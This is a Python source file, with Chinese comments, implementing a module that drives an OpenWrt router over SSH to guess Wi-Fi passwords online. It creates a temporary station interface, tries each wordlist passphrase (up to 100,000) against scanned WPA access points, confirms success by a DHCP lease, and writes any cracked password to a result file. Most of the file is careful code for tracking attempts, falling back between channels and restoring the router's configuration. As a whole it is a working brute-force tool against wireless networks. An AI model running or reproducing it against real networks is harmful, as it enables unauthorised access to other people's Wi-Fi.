"""OpenWrt 在线密码字典验证任务接口。"""

import json
import re
import secrets
import time
from dataclasses import dataclass, field, replace
from contextlib import contextmanager
from pathlib import Path

from modules.capture_services.openwrt.command_builder import normalize_bssid, quote_argument
from .verification_diagnostics import verification_phase
from .signal_recovery import SIGNAL_READY_SECONDS
from .password_environment import (interface_snapshot, radio_disabled_snapshot, DISABLED_VALUES,
                                   restore_disabled, isolated_network, RELOAD_CHANGED_CONFIG)
from modules.capture_services.openwrt.result_converter import final_results_dir, safe_result_stem


# 字典上限：在线逐个试连很慢，超限只取前部并如实告知，避免任务跑到天荒地老。
_MAX_CANDIDATES = 100000

# 远端备份与临时配置统一放在会话独立目录，不用固定 .bak 覆盖用户旧备份。
_REMOTE_BACKUP_FILES = ("wireless", "network")


@dataclass(frozen=True)
class PasswordTargetResult:
    """单个目标的验证结局：found 为真时 password_file 是写有密码的结果文件。

    结果模型不携带密码；已找到的密码只经临时通知显示，不写入日志和快照。
    """

    bssid: str
    ssid: str
    found: bool
    tried: int
    total: int
    password_file: str = ""
    note: str = ""
    skipped: int = 0
    final: bool = True
    error: bool = False
    unconfirmed: int = 0
    outcome: str = ""


@dataclass(frozen=True)
class PasswordVerifyUpdate:
    """V worker 发给主线程的逐密码进度，不携带候选密码内容。"""

    tried: int
    total: int
    target_label: str = ""
    target_index: int = 0
    target_total: int = 0
    engine: str = ""
    target_bssid: str = ""
    candidate: str = field(default="", repr=False)
    history_skipped: int = 0
    speed_text: str = ""
    speed_only: bool = False
    attempt_started: float = 0.0
    attempt_elapsed: float = -1.0
    phase: str = ""


class PasswordVerifyCancelled(RuntimeError):
    """用户取消或 SSH 中断时的内部控制流，已试部分保留计数。"""


class PasswordVerifyPreparationError(RuntimeError):
    """准备阶段可安全展示的原因（只有频段、配置段名和计数，不含口令/SSID）。

    这条说明由程序自己写，可以原样带给用户；其他异常仍按原规则脱敏。
    """


class PasswordTargetTimeout(TimeoutError):
    """A submitted target timed out; counts only, never candidate contents."""
    def __init__(self, tried, total, skipped):
        self.tried,self.total,self.skipped=tried,total,skipped
        super().__init__('Target authentication timed out')


def dictionary_paths(settings):
    """返回按顺序去重、解析便携标记的字典列表，兼容旧单路径设置。"""
    from modules.config_services.capture_settings_manager import CaptureSettingsManager
    values = settings.get("password_dictionaries")
    if not isinstance(values, (list, tuple)):
        values = [settings.get("password_dictionary", "")]
    paths = []
    seen = set()
    for value in values:
        if not isinstance(value, str) or not value.strip():
            continue
        path = str(CaptureSettingsManager.resolve_path(value.strip()))
        key = path.casefold()
        if key not in seen:
            paths.append(path)
            seen.add(key)
    return tuple(paths)


class OpenWrtPasswordVerifier:
    """隔离高副作用密码验证，不与普通抓包或 WPS 实现混合。

    流程：读本地字典→选 radio→唯一备份→建临时 STA→逐密码试连（ubus 判成功）→
    局部恢复并读回核验。任何退出路径都尝试恢复路由器配置。
    """

    def __init__(self, command_runner):
        self.command_runner = command_runner
        self._original_disabled = {}
        self._original_devices = {}
        self._original_radio_disabled = {}
        self._modified_ifaces = set()
        self._enabled_radios = set()
        self._restore_check = None

    @staticmethod
    def load_candidates(local_path, cancel_event=None):
        """读取 Windows 本地字典，返回 (候选元组, 跳过数)。

        Only unique 8-63-byte passphrases or 64 hexadecimal digits are accepted.
        The caller checks file existence; oversized dictionaries are bounded.
        """

        from .password_rounds import load_rounds
        rounds,skipped=load_rounds(local_path,cancel_event,_MAX_CANDIDATES)
        return tuple(password for group in rounds for password in group.candidates),skipped

    @verification_phase("execute")
    def verify_targets(
        self,
        targets,
        candidates,
        session_id,
        local_output_dir,
        cancel_event=None,
        progress_callback=None,
        target_callback=None,
        pause_control=None,
        *, rounds=(), dictionary_first=False, attempt_history=None, round_callback=None,
    ):
        """对多个已扫描目标逐个在线试密码，返回每目标结局元组。

        参数：targets 是 AccessPointInfo 元组；candidates 是口令元组；
        session_id 用于远端唯一命名；local_output_dir 是 Windows 结果目录；
        cancel_event 取消；progress_callback 接收 PasswordVerifyUpdate；
        target_callback(index, entry) 只报告开始（entry 为 None）与实际结局。
        pause_control 只在目标/候选边界等待，当前候选完成后暂停，恢复阶段不等待。
        副作用：仅修改所选网卡和本任务网络配置（先独立备份，finally 恢复）。
        """

        local_output_dir = Path(local_output_dir)
        short = "".join(char for char in str(session_id or "") if char.isalnum())[:8] or "session"
        sta_section = f"wifinet_pw{short}"
        net_name = f"pwnet_{short}"
        backup_dir = f"/tmp/winbox-pw-{short}"
        results = []
        setup_done = False
        self.last_restore_errors = ""
        self._configuration_touched = False
        self._modified_ifaces = set()
        self._enabled_radios = set()
        self._restore_check = None
        primary_error = None
        self._attempt_history = attempt_history
        try:
            self._backup_configs(backup_dir, cancel_event)
            from .password_rounds import run_rounds
            results=list(run_rounds(self,targets,candidates,sta_section,net_name,local_output_dir,
                cancel_event,progress_callback,target_callback,pause_control,rounds,
                dictionary_first,round_callback))
        except Exception as exc:
            primary_error = exc
            raise
        finally:
            self._attempt_history = None
            finish_error = None
            if pause_control is not None:
                try:
                    self._finish_pause(pause_control)
                except Exception as exc:
                    finish_error = exc
            try:
                self.last_restore_errors = self._restore(sta_section, net_name, backup_dir, cancel_event)
            except Exception:
                self.last_restore_errors = "路由器配置恢复异常，请重新连接后核实无线配置和网络状态。"
                if primary_error is None:
                    raise
            finally:
                self._restore_check = None
            if finish_error is not None and primary_error is None:
                raise RuntimeError("任务控制收尾异常，已尝试恢复路由器配置，请检查任务状态。") from None
        if self.last_restore_errors and results:
            last = results[-1]
            results[-1] = replace(last, note="；".join(filter(None, [last.note, self.last_restore_errors])))
        return tuple(results)

    @verification_phase("finish_control")
    def _finish_pause(self, pause_control):
        pause_control.finish()

    def _verify_single(
        self,
        target,
        candidates,
        index,
        total_targets,
        sta_section,
        net_name,
        local_output_dir,
        cancel_event,
        progress_callback,
        setup_done,
        pause_control=None,
    ):
        """验证单个目标：建 STA 环境（首个目标一次）后逐密码试连。"""

        try:
            bssid = normalize_bssid(target.bssid)
        except ValueError:
            return {
                "entry": PasswordTargetResult(
                    bssid=str(target.bssid or ""),
                    ssid=str(target.ssid or ""),
                    found=False,
                    tried=0,
                    total=len(candidates),
                    note="BSSID 格式不正确，跳过。",
                ),
                "setup_done": setup_done,
            }
        ssid = str(target.ssid or "").strip()
        encryption = str(getattr(target, "encryption", "") or "").upper()
        if not ssid or getattr(target, "ssid_hidden", False):
            return {
                "entry": PasswordTargetResult(
                    bssid=bssid,
                    ssid=ssid,
                    found=False,
                    tried=0,
                    total=len(candidates),
                    note="隐藏网络无法定向试连，跳过。",
                ),
                "setup_done": setup_done,
            }
        if "OPN" in encryption or not encryption:
            return {
                "entry": PasswordTargetResult(
                    bssid=bssid,
                    ssid=ssid,
                    found=False,
                    tried=0,
                    total=len(candidates),
                    note="开放网络无需猜密码，跳过。",
                ),
                "setup_done": setup_done,
            }
        from .password_security import unsupported_security_note
        security_note = unsupported_security_note(encryption)
        if security_note:
            return {
                "entry": PasswordTargetResult(
                    bssid=bssid,
                    ssid=ssid,
                    found=False,
                    tried=0,
                    total=len(candidates),
                    note=security_note,
                ),
                "setup_done": setup_done,
            }
        history = getattr(self, "_attempt_history", None)
        skipped = 0
        if history is not None:
            pending = history.filter_pending(target, candidates, cancel_event)
            skipped = len(candidates) - len(pending)
            candidates = pending
        if not candidates:
            return {"entry": PasswordTargetResult(bssid,ssid,False,0,skipped,
                note="本轮没有新候选，已跳过已尝试记录。",skipped=skipped),"setup_done":setup_done}
        label = ssid or bssid
        def phase(text):
            if progress_callback is not None:
                progress_callback(PasswordVerifyUpdate(0,len(candidates),target_label=label,
                    target_index=index,target_total=total_targets,target_bssid=bssid,phase=text))
        radio = self._pick_radio(str(getattr(target, "band", "2.4G") or "2.4G"), cancel_event)
        if not setup_done or getattr(self, "_verification_radio", None) != radio:
            phase("\u6b63\u5728\u51c6\u5907\u9a8c\u8bc1\u73af\u5883")
            self._setup_environment(sta_section, net_name, radio, cancel_event)
            self._verification_radio = radio
            setup_done = True
        phase("正在检测快速模式（等待控制服务响应）")
        from .password_control import ControlRequestTimeout
        control = self._open_control(sta_section, cancel_event, phase)
        compatibility = control is None
        restarted = False
        tried = 0
        unconfirmed = 0
        try:
            position = 0
            while position < len(candidates):
                password = candidates[position]
                if pause_control is not None:
                    pause_control.checkpoint()
                self._check_cancel(cancel_event)
                tried += 1
                attempt_started = time.monotonic()
                if progress_callback is not None:
                    progress_callback(
                        PasswordVerifyUpdate(
                            tried=tried,
                            total=len(candidates),
                            target_label=label,
                            target_index=index,
                            target_total=total_targets,
                            engine=("native" if control is not None and not compatibility
                                    else "compatibility"),
                            target_bssid=bssid,
                            candidate=password,
                            attempt_started=attempt_started,
                            history_skipped=skipped,
                        )
                    )
                connected = None
                while True:
                    if compatibility:
                        self._set_credentials(sta_section, ssid, bssid, password, cancel_event)
                        connected = self._verify_connection(net_name, cancel_event)
                        break
                    try:
                        connected = control.attempt(ssid, bssid, password)
                        break
                    except PasswordVerifyCancelled:
                        raise
                    except (ControlRequestTimeout, ConnectionError, RuntimeError):
                        # Channel-level failure only: the candidate's result is
                        # unknown, so it is never counted as a wrong password.
                        self._check_cancel(cancel_event)
                        if not self.command_runner.ssh_client.connected:
                            raise
                        fresh = (None if restarted else
                                 self._recover_control(control, sta_section, cancel_event, phase))
                        restarted = True
                        if fresh is not None:
                            control = fresh
                            phase("快速验证通道已恢复，正在重试当前密码")
                            continue
                        try:
                            control.close()
                        except Exception:
                            pass
                        control = None
                        compatibility = True
                        phase("快速验证通道不可用，本信号改用兼容验证继续")
                if progress_callback is not None:
                    from .password_speed import PasswordAttemptElapsed
                    progress_callback(PasswordAttemptElapsed(time.monotonic() - attempt_started))
                if connected is None:
                    unconfirmed += 1
                if history is not None and connected is False:
                    history.mark(target, password)
                if connected:
                    stem = safe_result_stem(ssid, bssid) + "-" + bssid.replace(":", "")
                    out_path = final_results_dir(local_output_dir) / f"{stem}-password.txt"
                    # 密码只写结果文件，不进日志、消息和快照。
                    fields = [
                        value.replace("\\", "\\\\").replace("\t", "\\t").replace("\r", "\\r").replace("\n", "\\n")
                        for value in (ssid, bssid, password)
                    ]
                    out_path.write_text("Wi-Fi名称\tMAC\t密码\n" + "\t".join(fields) + "\n", encoding="utf-8")
                    if history is not None:
                        history.mark_success(target, password, out_path)
                    if progress_callback is not None:
                        from .password_events import PasswordFoundNotice
                        progress_callback(PasswordFoundNotice(ssid, bssid, str(out_path), password))
                    return {
                        "entry": PasswordTargetResult(
                            bssid=bssid,
                            ssid=ssid,
                            found=True,
                            tried=tried,
                            total=len(candidates),
                            password_file=str(out_path),
                            skipped=skipped,
                        ),
                        "setup_done": setup_done,
                    }
                position += 1
        except PasswordVerifyCancelled:
            raise
        except InterruptedError:
            raise PasswordVerifyCancelled("在线密码验证已取消。") from None
        except TimeoutError as exc:
            # A command-level timeout skips only this target; the batch keeps
            # going with the next signal instead of ending the whole task.
            self._check_cancel(cancel_event)
            if not self.command_runner.ssh_client.connected:
                raise
            raise PasswordTargetTimeout(tried, len(candidates), skipped) from exc
        finally:
            if control is not None:
                control.close()
        return {
            "entry": PasswordTargetResult(
                bssid=bssid,
                ssid=ssid,
                found=False,
                tried=tried,
                total=len(candidates),
                note=(f"本轮有 {unconfirmed} 个候选的连接结果未确认，未判定为密码错误，也未写入永久跳过记录。"
                      if unconfirmed else f"字典 {len(candidates)} 个候选全部试过，未连上。"),
                skipped=skipped,
                unconfirmed=unconfirmed,
            ),
            "setup_done": setup_done,
        }

    def _open_control(self, section, cancel_event, phase_callback=None):
        """Open the native channel; None means the compatibility path is used."""

        from .password_control import open_control, ControlUnavailable
        control = None
        try:
            control = open_control(self.command_runner, section, cancel_event)
            if control is None and phase_callback is not None:
                from .password_control_diagnostics import unavailable_message
                phase_callback(unavailable_message("native_tool_missing"))
        except ControlUnavailable as error:
            if phase_callback is not None:
                from .password_control_diagnostics import unavailable_message
                phase_callback(unavailable_message(getattr(error, "native_reason", "native_initialization_failed")))
            # Capability fallback is allowed only before submitting a candidate.
            control = None
        except InterruptedError:
            raise PasswordVerifyCancelled("在线密码验证已取消。") from None
        except (TimeoutError, ConnectionError):
            # A capability probe is not the verification itself. Timing out here
            # must not end the batch; the compatibility path needs no wpa_cli.
            if phase_callback is not None:
                phase_callback("快速验证通道检测超时，本信号改用兼容验证")
            control = None
        journal = getattr(self.command_runner, "operation_diagnostics", None)
        if journal is not None:
            journal.record("workflow", operation="password_auth", stage="capabilities", status="completed",
                           reason="native_control_ready" if control is not None else "native_control_unavailable")
        return control

    def _recover_control(self, control, section, cancel_event, phase_callback):
        """One bounded restart of the native channel; None means fall back."""

        journal = getattr(self.command_runner, "operation_diagnostics", None)
        if journal is not None:
            journal.record("workflow", operation="password_auth", stage="capabilities",
                           status="completed", reason="native_control_lost")
        try:
            control.close()
        except Exception:
            pass
        phase_callback("快速验证通道已断开，正在尝试重启一次")
        try:
            fresh = self._open_control(section, cancel_event, phase_callback)
        except (PasswordVerifyCancelled, InterruptedError):
            raise
        except Exception:
            fresh = None
        if journal is not None:
            journal.record("workflow", operation="password_auth", stage="capabilities",
                           status="completed",
                           reason=("native_control_restarted" if fresh is not None
                                   else "native_control_restart_failed"))
        return fresh

    @contextmanager
    def _control_session(self, section, cancel_event, phase_callback=None):
        """Compatibility wrapper kept for callers that only need one session."""

        control = self._open_control(section, cancel_event, phase_callback)
        try:
            yield control
        except InterruptedError:
            raise PasswordVerifyCancelled("在线密码验证已取消。") from None
        finally:
            if control is not None:
                try:
                    control.close()
                except Exception:
                    pass

    @verification_phase("select_radio")
    def _pick_radio(self, band, cancel_event):
        """按频段选一个可用的 wireless 设备名，不存在时给出可读原因。"""

        from .radio_takeover import OpenWrtRadioTakeover, _parse_iwdev_interfaces
        from .radio_identity import snapshot_radio_mapping, uci_radio_bands
        self._check_cancel(cancel_event)
        wanted = {"2.4G": "2g", "2G": "2g", "5G": "5g", "6G": "6g"}.get(str(band).upper())
        if wanted is None:
            raise PasswordVerifyPreparationError("无法识别目标频段，请刷新扫描结果后重试。")
        try:
            snapshot = OpenWrtRadioTakeover(self.command_runner).snapshot_wireless(cancel_event)
        except RuntimeError as exc:
            # snapshot_wireless 的说明由程序自己写，只包含读取无线信息失败，可直接展示。
            raise PasswordVerifyPreparationError(str(exc)) from exc
        interfaces = {p: tuple(name for name, _ in rows)
                      for p, rows in _parse_iwdev_interfaces(snapshot).items()}
        mapping = snapshot_radio_mapping(snapshot, interfaces)
        disabled = set(re.findall(r"(?m)^wireless\.([A-Za-z0-9_]+)\.disabled=['\"]?(?:1|true|yes|on)['\"]?\s*$", snapshot))
        bands = uci_radio_bands(snapshot)
        same_band = sorted(radio for radio, actual in bands.items() if actual == wanted)
        unavailable = [radio for radio in same_band if radio in disabled]
        unmapped = [radio for radio in same_band if radio not in mapping]
        candidates = [radio for radio in same_band
                      if radio in mapping and radio not in disabled]
        if len(candidates) == 1:
            return candidates[0]
        if not candidates and len(same_band) == 1 and same_band[0] in mapping:
            return same_band[0]
        raise PasswordVerifyPreparationError(
            self._band_reason(band, same_band, candidates, unavailable, unmapped))

    @staticmethod
    def _band_reason(band, same_band, candidates, unavailable, unmapped):
        """把“选不出唯一网卡”翻成具体那一类原因，避免落到通用提示。"""

        label = str(band)
        if not same_band:
            return (f"路由器的无线配置里没有声明 {label} 频段的网卡，无法开始试密码。"
                    "请刷新扫描结果，或在路由器上核对无线配置的频段设置后再试。")
        if len(candidates) > 1:
            return (f"{label} 频段匹配到多块网卡（{'、'.join(candidates)}），"
                    "为避免改错无线配置已停止；请核对路由器无线设置后重试。")
        if unavailable:
            return (f"{label} 频段的无线网卡处于停用状态（{'、'.join(unavailable)}），"
                    "请先在路由器上启用该频段后再试。")
        if unmapped:
            return (f"{label} 频段的无线网卡无法和实际硬件唯一对应（{'、'.join(unmapped)}），"
                    "已停止验证；请刷新无线信息后重试。")
        return (f"无法确认 {label} 频段对应的无线网卡，请刷新无线信息后重试。")

    @verification_phase("configure")
    def _setup_environment(self, sta_section, net_name, radio, cancel_event):
        """Configure the selected radio only; isolate the temporary DHCP route and DNS."""

        original_flag = self._original_radio_disabled.get(radio)
        newly_enabled = radio not in self._enabled_radios
        if original_flag in DISABLED_VALUES:
            before = self._restore_check.baseline.get(radio) if self._restore_check is not None else None
            if (before is None or before.get('disabled') is not True
                    or before.get('pending') is not False or before.get('up') is not False):
                raise PasswordVerifyPreparationError(
                    "\u539f\u6765\u505c\u7528\u7684\u7f51\u5361\u72b6\u6001\u5c1a\u672a\u786e\u8ba4\uff0c\u672a\u4fee\u6539\u914d\u7f6e\uff1b\u8bf7\u5237\u65b0\u65e0\u7ebf\u4fe1\u606f\u540e\u91cd\u8bd5\u3002")
            self._enabled_radios.add(radio)
        commands = [
            f"uci set wireless.{sta_section}=wifi-iface",
            f"uci set wireless.{sta_section}.device={quote_argument(radio)}",
            f"uci set wireless.{sta_section}.network={quote_argument(net_name)}",
            f"uci set wireless.{sta_section}.mode='sta'",
            f"uci set wireless.{sta_section}.encryption='psk2'",
            f"uci set wireless.{sta_section}.ssid={quote_argument('verify-' + sta_section)}",
            f"uci set wireless.{sta_section}.key={quote_argument(secrets.token_hex(16))}",
            f"uci set wireless.{sta_section}.disabled='0'",
            f"uci set network.{net_name}=interface",
            f"uci set network.{net_name}.proto='dhcp'",
        ]
        commands.extend(isolated_network(net_name))
        # Restore the previous task radio before moving the temporary STA to another.
        for previous in sorted(self._enabled_radios - {radio}):
            commands.append(restore_disabled(previous, self._original_radio_disabled[previous]))
        for iface in sorted(self._modified_ifaces):
            if self._original_devices.get(iface) != radio:
                commands.append(restore_disabled(iface, self._original_disabled[iface]))
        others = self._other_ifaces(sta_section, cancel_event, radio)
        self._modified_ifaces.update(others)
        for iface in others:
            commands.append("uci set " + quote_argument(f"wireless.{iface}.disabled=1"))
        if radio in self._enabled_radios:
            commands.append("uci set " + quote_argument(f"wireless.{radio}.disabled=0"))
        commands.extend(["uci commit wireless", "uci commit network"])
        if self._restore_check is not None:
            self._restore_check.affected_radios.add(radio)
        recovery = getattr(self, 'recovery_journal', None)
        if recovery is not None:
            recovery.arm(self._modified_ifaces, self._restore_check.affected_radios,
                **({"enabled_radios": self._enabled_radios} if self._original_radio_disabled else {}))
            from .password_pending_changes import snapshot_guards
            pending_guards = snapshot_guards(self.command_runner, sta_section, net_name,
                                            self._modified_ifaces | self._enabled_radios, cancel_event,
                                            allow_owned=getattr(self, '_configuration_touched', False))
            commands = pending_guards + recovery.guarded_setup(commands)
        if self._enabled_radios:
            from .password_recovery import _original_or_disabled
            guards = []
            for name in sorted(self._enabled_radios):
                original = self._original_radio_disabled[name]
                guards.append('[ "$(uci -q get '+quote_argument('wireless.'+name)+')" = wifi-device ]')
                guards.append(_original_or_disabled(name, original,
                    original if name == radio and newly_enabled else '0'))
            commands = guards + commands
        self._run_batch("password_setup_env", commands, cancel_event)
        self._run("password_reload", RELOAD_CHANGED_CONFIG, 60, cancel_event)
        self._sleep(5, cancel_event)
        # netifd auto-starts this enabled network on reload. OpenWrt ifup
        # reloads again and forces down/up, disrupting the just-created STA.

    def _set_credentials(self, sta_section, ssid, bssid, password, cancel_event):
        """写入本次试连的 SSID/BSSID/密码并重载无线。"""

        commands = [
            f"uci set wireless.{sta_section}.ssid={quote_argument(ssid)}",
            f"uci set wireless.{sta_section}.bssid={quote_argument(bssid)}",
            f"uci set wireless.{sta_section}.key={quote_argument(password)}",
            "uci commit wireless",
        ]
        # Apply only after all settings have succeeded, in one owned SSH request.
        commands.append(RELOAD_CHANGED_CONFIG)
        self._run("password_set_cred", " && ".join(commands), 60, cancel_event)
        self._sleep(5, cancel_event)

    def _verify_connection(self, net_name, cancel_event):
        """用 netifd 状态判断是否拿到 IPv4，连续稳定才算成功。"""

        stable = 0
        for _round in range(14):
            self._check_cancel(cancel_event)
            if self._interface_up(net_name, cancel_event):
                self._check_cancel(cancel_event)
                stable += 1
                # 密码错误有时短暂关联后即断，连续 3 轮都在才算。
                if stable >= 3:
                    return True
            else:
                stable = 0
            # There is no next observation after the final sample.
            if _round < 13:
                self._sleep(2, cancel_event)
        # No IPv4 confirmation is not a cryptographic wrong-key verdict.
        return None

    def _interface_up(self, net_name, cancel_event):
        """读 ubus 看接口是否 up 且有 IPv4；解析失败按未连上处理。"""

        try:
            result = self.command_runner.run(
                "password_check_link",
                f"ubus call network.interface.{net_name} status",
                timeout=15,
                cancel_event=cancel_event,
            )
        except Exception:
            return False
        self._raise_if_cancelled(result, "在线密码验证已取消。")
        if result.exit_code != 0:
            return False
        try:
            data = json.loads(result.stdout or "{}")
        except (ValueError, TypeError):
            return False
        if not isinstance(data, dict) or not data.get("up"):
            return False
        addresses = data.get("ipv4-address") or []
        return any(isinstance(item, dict) and item.get("address") for item in addresses)

    @verification_phase("backup")
    def _backup_configs(self, backup_dir, cancel_event):
        """把 wireless/network 拷到会话独立远端目录，不覆盖用户旧备份。"""

        self._check_cancel(cancel_event)
        commands = [f"mkdir -p {quote_argument(backup_dir)}"]
        for name in _REMOTE_BACKUP_FILES:
            commands.append(
                f"cp /etc/config/{name} {quote_argument(backup_dir)}/{name} 2>/dev/null"
            )
        # 记下其他 wifi-iface 的 disabled 原值，恢复时按名写回。
        self._run_batch("password_backup", commands, cancel_event)
        self._original_disabled = self._read_disabled_map(cancel_event)
        from .password_restore import PasswordRestoreCheck
        self._restore_check = PasswordRestoreCheck.capture(self.command_runner, cancel_event)
        recovery = getattr(self, 'recovery_journal', None)
        if recovery is not None:
            recovery.capture(self._original_disabled, self._original_devices, self._restore_check.baseline,
                **({"radio_disabled": self._original_radio_disabled} if self._original_radio_disabled else {}))
        self._wan_zone = None

    def _read_disabled_map(self, cancel_event):
        """读取接口的稳定名称和 disabled 原值；读取失败时停止修改。"""

        result = self.command_runner.run("password_read_ifaces", "uci -X show wireless", timeout=20, cancel_event=cancel_event)
        self._raise_if_cancelled(result, "\u5728\u7ebf\u5bc6\u7801\u9a8c\u8bc1\u5df2\u53d6\u6d88\u3002")
        if result.exit_code != 0 or result.timed_out:
            raise RuntimeError("\u65e0\u6cd5\u8bfb\u53d6\u65e0\u7ebf\u63a5\u53e3\u5f52\u5c5e\uff0c\u5df2\u505c\u6b62\u9a8c\u8bc1\u4ee5\u907f\u514d\u5f71\u54cd\u4e0a\u7f51\u3002")
        disabled, self._original_devices = interface_snapshot(result.stdout)
        self._original_radio_disabled = radio_disabled_snapshot(result.stdout)
        return disabled

    def _other_ifaces(self, sta_section, cancel_event, radio):
        return [name for name in self._original_disabled
                if name != sta_section and self._original_devices.get(name) == radio]

    @verification_phase("restore")
    def _restore(self, sta_section, net_name, backup_dir, cancel_event):
        """Restore only owned configuration and selected-radio flags; never restart the network.

        返回值：空串表示干净恢复，否则是给用户看的恢复异常说明（不含密码）。
        """

        recovery = getattr(self, 'recovery_journal', None)
        if recovery is not None:
            if not getattr(self, '_configuration_touched', False):
                recovery.discard()
                return ''
            try:
                recovery.recover(self.command_runner, self.command_runner.ssh_client.host_fingerprint)
            except Exception:
                return "\u914d\u7f6e\u6062\u590d\u672a\u786e\u8ba4\uff0c\u6062\u590d\u8bb0\u5f55\u5df2\u4fdd\u7559\uff1b\u91cd\u65b0\u767b\u5f55\u540c\u4e00\u8def\u7531\u5668\u540e\u81ea\u52a8\u6062\u590d\u3002"
            return ''
        if not getattr(self, "_configuration_touched", True):
            return ""
        errors = []
        commands = [
            f"uci -q delete wireless.{sta_section} || true",
            f"uci -q delete network.{net_name} || true",
        ]
        for iface in sorted(self._modified_ifaces):
            commands.append(restore_disabled(iface,self._original_disabled[iface]))
        commands.extend(restore_disabled(radio, self._original_radio_disabled[radio])
                        for radio in sorted(self._enabled_radios))
        commands.extend(["uci commit wireless", "uci commit network"])
        for command in commands:
            try:
                self._run("password_restore",command,30,None)
            except Exception as exc:
                errors.append(f"\u5c40\u90e8\u914d\u7f6e\u6062\u590d\u5931\u8d25\uff1a{exc}")
        try:
            self._run("password_reload",RELOAD_CHANGED_CONFIG,60,None)
        except Exception as exc:
            errors.append(f"\u53d8\u66f4\u914d\u7f6e\u91cd\u8f7d\u5931\u8d25\uff1a{exc}")
        if self._restore_check is None:
            errors.append("\u914d\u7f6e\u5df2\u5c1d\u8bd5\u6062\u590d\uff0c\u7f3a\u5c11\u539f\u59cb\u8fd0\u884c\u72b6\u6001\uff0c\u6062\u590d\u7ed3\u679c\u5c1a\u672a\u786e\u8ba4\u3002")
        else:
            checked = self._restore_check.verify(sta_section, net_name, self._original_disabled,
                                                  self._original_devices, self._modified_ifaces,
                                                  wait_seconds=SIGNAL_READY_SECONDS,
                                                  **({"radio_disabled": {r: self._original_radio_disabled[r]
                                                      for r in self._enabled_radios}} if self._enabled_radios else {}))
            if checked:
                errors.append(checked)
        return "\uff1b".join(errors)

    def _run_batch(self, name, commands, cancel_event):
        """按序执行一批短命令；失败抛错，错误信息仅保留操作名和退出码。"""

        # Group each command so local "|| true" guards cannot hide an earlier
        # failure. One request avoids a new SSH channel for every UCI option.
        if commands:
            self._run(name, " && ".join("( " + command + " )" for command in commands),
                      30, cancel_event)

    def _run(self, name, command, timeout, cancel_event):
        """执行单条远端命令；取消、超时、非零退出一律抛错。"""

        self._check_cancel(cancel_event)
        if name in {"password_setup_env", "password_set_cred"}:
            self._configuration_touched = True
        result = self.command_runner.run(name, command, timeout=timeout, cancel_event=cancel_event)
        self._check_cancel(cancel_event)
        self._raise_if_cancelled(result, "在线密码验证已取消。")
        if getattr(result, "timed_out", False):
            raise TimeoutError(f"路由器命令超时：{name}。")
        if result.exit_code != 0:
            raise RuntimeError(f"路由器命令失败（{name}），退出码：{result.exit_code}。")

    @staticmethod
    def _raise_if_cancelled(result, message):
        if result.cancelled:
            raise PasswordVerifyCancelled(message)

    @staticmethod
    def _check_cancel(cancel_event):
        if cancel_event is not None and cancel_event.is_set():
            raise PasswordVerifyCancelled("在线密码验证已取消。")

    @staticmethod
    def _sleep(seconds, cancel_event):
        """可取消的等待，每 0.5 秒检查一次取消。"""

        deadline = time.monotonic() + max(0, seconds)
        while time.monotonic() < deadline:
            if cancel_event is not None and cancel_event.is_set():
                raise PasswordVerifyCancelled("在线密码验证已取消。")
            time.sleep(min(0.5, max(0.0, deadline - time.monotonic())))
